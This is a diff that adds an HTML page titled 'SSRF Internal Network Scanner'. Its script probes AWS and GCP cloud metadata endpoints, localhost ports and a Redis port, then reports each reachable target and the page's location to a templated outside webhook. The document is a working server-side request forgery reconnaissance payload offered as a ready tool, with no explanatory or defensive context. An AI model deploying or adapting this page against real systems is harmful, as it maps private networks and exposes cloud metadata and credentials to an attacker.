@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Internal Network Scanner</title>
+</head>
+<body>
+    <h1>SSRF Internal Network Scanner</h1>
+    <div id="results"></div>
+    <script>
+        const results = document.getElementById('results');
+        const targets = [
+            'http://169.254.169.254/latest/meta-data/',  // AWS metadata
+            'http://metadata.google.internal/computeMetadata/v1/',  // GCP metadata
+            'http://localhost:8080',
+            'http://localhost:3000',
+            'http://127.0.0.1:6379',  // Redis
+        ];
+
+        async function scanTarget(url) {
+            try {
+                const response = await fetch(url, { mode: 'no-cors' });
+                // Send result to webhook
+                fetch('{{WEBHOOK_URL}}/ssrf-scan', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        target: url,
+                        accessible: true,
+                        from: window.location.href
+                    })
+                });
+                return `✓ ${url}`;
+            } catch (err) {
+                return `✗ ${url}`;
+            }
+        }
+
+        Promise.all(targets.map(scanTarget)).then(res => {
+            results.innerHTML = '<ul>' + res.map(r => `<li>${r}</li>`).join('') + '</ul>';
+        });
+    </script>
+</body>
+</html>
